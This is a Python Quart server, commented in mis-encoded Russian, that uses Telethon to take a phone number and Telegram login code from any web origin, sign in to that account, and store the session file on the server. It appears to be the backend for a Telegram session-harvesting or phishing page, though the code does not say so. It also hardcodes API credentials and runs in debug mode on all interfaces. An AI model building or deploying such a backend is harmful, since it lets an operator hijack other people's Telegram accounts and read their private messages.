import asyncio
from quart import Quart, request, jsonify
from quart_cors import cors
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os

# --- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ---
API_ID = 26595249  # –£–∫–∞–∂–∏ —Å–≤–æ–π API ID
API_HASH = "9480dce5299fb30b4e520242dd6d87d8"  # –£–∫–∞–∂–∏ —Å–≤–æ–π API Hash
SESSION_DIR = "sessions"  # –ü–∞–ø–∫–∞ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–µ—Å—Å–∏–π

# –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è phone_code_hash
phone_code_hashes = {}

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è —Å–µ—Å—Å–∏–π, –µ—Å–ª–∏ –µ–µ –Ω–µ—Ç
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

app = Quart(__name__)
app = cors(app, allow_origin="*")

async def get_client(phone_number):
    """ –°–æ–∑–¥–∞–µ—Ç –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TelegramClient –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞ """
    session_path = os.path.join(SESSION_DIR, f"{phone_number}.session")
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    return client

@app.post("/send_phone")
async def send_phone():
    try:
        data = await request.json
        phone_number = data.get("phone")

        if not phone_number:
            return jsonify({"success": False, "error": "–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            send_code = await client.send_code_request(phone_number)
            phone_code_hashes[phone_number] = send_code.phone_code_hash  # –°–æ—Ö—Ä–∞–Ω—è–µ–º hash

        return jsonify({"success": True, "message": "–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω"}), 200

    except Exception as e:
        print("–û—à–∏–±–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500

@app.post("/send_code")
async def send_code():
    try:
        data = await request.json
        phone_number = data.get("phone")
        code = data.get("code")

        if not phone_number or not code:
            return jsonify({"success": False, "error": "–ù–æ–º–µ—Ä –∏ –∫–æ–¥ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã"}), 400

        if phone_number not in phone_code_hashes:
            return jsonify({"success": False, "error": "–°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—Ä–æ—Å–∏—Ç–µ –∫–æ–¥"}), 400

        client = await get_client(phone_number)

        if not await client.is_user_authorized():
            phone_code_hash = phone_code_hashes.pop(phone_number)  # –ü–æ–ª—É—á–∞–µ–º –∏ —É–¥–∞–ª—è–µ–º hash
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)

        return jsonify({"success": True, "message": "–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω"}), 200

    except SessionPasswordNeededError:
        return jsonify({"success": False, "error": "–ù—É–∂–µ–Ω –ø–∞—Ä–æ–ª—å 2FA"}), 401
    except Exception as e:
        print("–û—à–∏–±–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    print("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω")
   
PORT = int(os.environ.get("PORT", 5701))  # –ë–µ—Ä–µ–º –ø–æ—Ä—Ç –∏–∑ –æ–∫—Ä—É–∂–µ–Ω–∏—è, –∏–Ω–∞—á–µ 5701
asyncio.run(app.run(host="0.0.0.0", port=PORT, debug=True))




